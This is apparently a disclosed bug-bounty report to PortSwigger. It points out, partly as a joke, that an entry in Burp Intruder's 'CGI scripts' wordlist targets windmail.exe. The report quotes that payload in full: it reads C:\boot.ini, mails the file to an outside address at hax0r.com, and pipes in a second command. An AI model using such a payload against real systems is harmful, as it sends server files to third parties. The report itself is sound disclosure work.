# cgi scripts wordlist entry for windmail.exe has payload that sends arbitrary file read result to third-party

## Report Details
- **Report ID**: 2733994
- **URL**: https://hackerone.com/reports/2733994
- **State**: Closed
- **Severity**: low
- **Submitted**: 2024-09-22T19:20:36.303Z
- **Disclosed**: 2025-03-13T15:44:25.943Z

## Reporter
- **Username**: floyd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: portswigger

## Vulnerability Information
1. Get to your basement, look for that floppy disc copy of windmail.exe
2. Install windmail.exe on a Windows 98 server (good luck with that)
3. Run Burp's Intruder payload list `CGI scripts` against the folder `/cgi-bin/` where you installed that nifty windmail.exe
4. Burp will send the following payload from the wordlist: `WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\`
5. Due to the payload, windmail.exe will send the C:\boot.ini file to the email address Hacker@hax0r.com according to https://seclists.org/bugtraq/2000/Mar/322
6. hax0r.com is currently up for sale: http://hax0r.com

If you are going to argue that nobody is running windmail.exe in 2024, why is that entry still in the wordlist? :D

Although that's really what happens, don't take this report too serious ;) . Am I the only person in the last 20 years who really went through the wordlist manually? But I would still change that one entry.

## Impact

Burp sends the not-very-confidential file C:\boot.ini of an exploited server to the e-mail address Hacker@hax0r.com

## Attachments
No attachments
